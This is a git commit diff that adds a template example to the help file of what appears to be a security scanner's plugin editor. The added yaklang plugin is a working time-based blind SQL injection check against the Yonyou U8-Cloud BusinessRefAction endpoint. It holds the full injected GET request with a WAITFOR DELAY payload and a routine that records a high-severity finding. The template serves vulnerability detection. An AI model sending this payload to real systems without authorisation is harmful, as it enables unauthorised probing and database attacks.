f56c5ad973bf1e377f00c259dcb99b9d1234a74c
song_xiao_lin <song_xiao_lin@126.com>
2024-08-29 15:21:31 +0800

    feat: 新增模板案例

--- app/renderer/src/main/src/pages/pluginEditor/editorInfo/TempExampleHelp.tsx
+++ app/renderer/src/main/src/pages/pluginEditor/editorInfo/TempExampleHelp.tsx
@@ -278,6 +278,58 @@ http:
     - contains(body,flag)
     condition: and
 \`\`\``
+    },
+    {
+      label: "用友 U8-Cloud SQL 注入：基于时间盲注模版",
+      desc: "端口扫描",
+      code: `\`\`\`port-scan
+yakit.AutoInitYakit()
+
+handleCheck = func(target, port) {
+    addr = str.HostPort(target, port)
+    isTls = str.IsTLSServer(addr)
+
+    // yaklang 版本 >= beta8
+    packet1 = <<<EOF
+GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
+Host: {{params(target)}}
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+
+EOF
+    begin_time = time.Now()
+    rsp, req = poc.HTTP(packet1, poc.params({"target": addr}), poc.https(isTls), poc.redirectTimes(0))~
+    if time.Since(begin_time).Seconds() > 5 {
+        yakit.Info(
+            "%v found 用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞", 
+            addr, 
+        )
+        risk.NewRisk(
+            addr, 
+            risk.title("用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞：" + addr), 
+            risk.severity("high"), 
+            risk.titleVerbose("用友U8-Cloud系统BusinessRefAction存在SQL注入漏洞"), 
+            risk.request(string(req)), 
+            risk.response(string(rsp)), 
+            risk.cve("no cve"), 
+        )
+    }
+    
+    return
+}
+
+handle = func(result /* *fp.MatchResult */) {
+    if !result.IsOpen() {
+        return
+    }
+
+    if len(result.Fingerprint.HttpFlows) > 0 {
+        handleCheck(result.Target, result.Port)
+    }
+}
+\`\`\``
     }
 ]
 interface TempExampleHelpProps {
